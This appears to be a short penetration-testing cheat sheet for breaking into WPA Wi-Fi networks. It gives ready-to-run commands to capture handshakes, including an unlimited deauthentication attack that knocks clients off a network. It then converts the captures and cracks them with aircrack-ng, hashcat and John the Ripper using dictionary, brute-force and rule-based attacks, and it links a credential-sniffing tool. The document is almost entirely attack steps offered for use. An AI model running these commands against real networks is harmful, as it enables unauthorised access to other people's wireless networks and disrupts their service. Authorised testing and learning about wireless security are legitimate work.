## Capture Handshake

1. airmon-ng start wlan0
2. airodump-ng mon0 --write capture.cap -c 11
3. aireplay-ng --deauth 0 -a bb:bb:bb:bb:bb:bb mon0

Convert pcap files for john and hashcat

/usr/lib/hashcat-utils/cap2hccapx.bin input.pcap output.hccapx [filter by essid] [additional network essid:bssid]
/usr/sbin/hccap2john
/usr/sbin/vncpcap2john
/usr/sbin/wpapcap2john


## Cracking Handshake with Aircrack

- aircrack-ng -w /usr/share/wordlist/fasttrack.txt 0001.cap

## Cracking Handshakes with Hashcat

- hashcat.exe -m 2500 capture.hccapx rockyou.txt (Dictionary Attack)
- hashcat.exe -m 2500 -a3 capture.hccapx ?d?d?d?d?d?d?d?d (Brute-Force)
- hashcat.exe -m 2500 -r rules/best64.rule capture.hccapx rockyou.txt (Rule-Based)

## Cracking Handshakes with John The Ripper

Did you run hccap2john?

- john --format=wpapsk --wordlist=/usr/share/wordlists/rockyou.txt crackmecap
- john --format=wpapsk-opencl --wordlist=/usr/share/wordlists/rockyou.txt crackmecap



Other Resources: 

https://github.com/lgandx/PCredz 